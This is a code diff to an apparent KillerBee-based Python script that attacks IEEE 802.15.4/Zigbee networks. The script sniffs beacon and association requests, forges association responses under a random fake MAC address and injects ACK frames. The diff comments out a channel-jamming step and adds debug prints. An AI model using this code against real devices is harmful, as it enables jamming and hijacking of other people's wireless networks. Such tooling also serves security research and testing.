@@ -96,8 +96,8 @@ if __name__ == '__main__':
                     counter += 1
         kb.sniffer_off()
 
-        print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
-        kb.inject(JAM_PKT_BYTES)
+        #print('4. Jamming channel for ' + str(JAM_TIME_SEC) + ' seconds.')
+        #kb.inject(JAM_PKT_BYTES)
 
         #kb.jammer_on()
         #time.sleep(JAM_TIME_SEC)
@@ -105,14 +105,14 @@ if __name__ == '__main__':
 
         # Increment channel
         # TODO: Are channel scans incremental from 11 to 26?
-        new_channel = args.channel + CHANNEL_INCREMENT
-        print('5. Changing channel from ' + str(args.channel) + ' to ' + str(new_channel) + '.')
-        kb.set_channel(new_channel)
+        #new_channel = args.channel + CHANNEL_INCREMENT
+        #print('5. Changing channel from ' + str(args.channel) + ' to ' + str(new_channel) + '.')
+        #kb.set_channel(new_channel)
 
         # Wait for another beacon request
         print('6. Listening for a beacon request from another device...')
         got_beacon_request = False
-        kb.sniffer_on(new_channel)
+        kb.sniffer_on()
         br_seq_num = 0
         while not got_beacon_request:
             packet = kb.pnext()
@@ -136,7 +136,7 @@ if __name__ == '__main__':
         # Wait for association request
         print('8. Listening for association request.')
         got_assoc_request = False
-        kb.sniffer_on(new_channel)
+        kb.sniffer_on()
         assoc_request_pkt_bytes = None
         while not got_assoc_request:
             packet = kb.pnext()
@@ -154,7 +154,7 @@ if __name__ == '__main__':
 
         # Construct association response
         assoc_response_seq_num = assoc_request_pkt_bytes[2]+1
-        assoc_response_dest_mac = assoc_request_pkt_bytes[8:17]
+        assoc_response_dest_mac = assoc_request_pkt_bytes[9:17]
         assoc_response_dest_pan = assoc_request_pkt_bytes[3:5]
         fake_mac_addr_bytes = bytearray(kbutils.randmac())
         # 1. 2 bytes of frame info and sequence number (assoc request SN + 1)
@@ -178,12 +178,14 @@ if __name__ == '__main__':
             sniffer_on = False
             while not packet:
                 if not sniffer_on:
-                    kb.sniffer_on(new_channel)
+                    kb.sniffer_on()
                     sniffer_on = True
+                    print('Sniffer on')
 
                 packet = kb.pnext()
                 if packet:
                     packet_bytes = bytearray(packet['bytes'])
+                    print('Got packet: ' + str(packet_bytes))
                     packet_seq_num = packet_bytes[2]
                     # Check for data requests.
                     # 1. Command header
@@ -199,6 +201,7 @@ if __name__ == '__main__':
 
                     kb.sniffer_off()
                     sniffer_off = True
+                    print('Sniffer off')
 
                     kb.inject([0x02, 0x00, packet_seq_num])
 
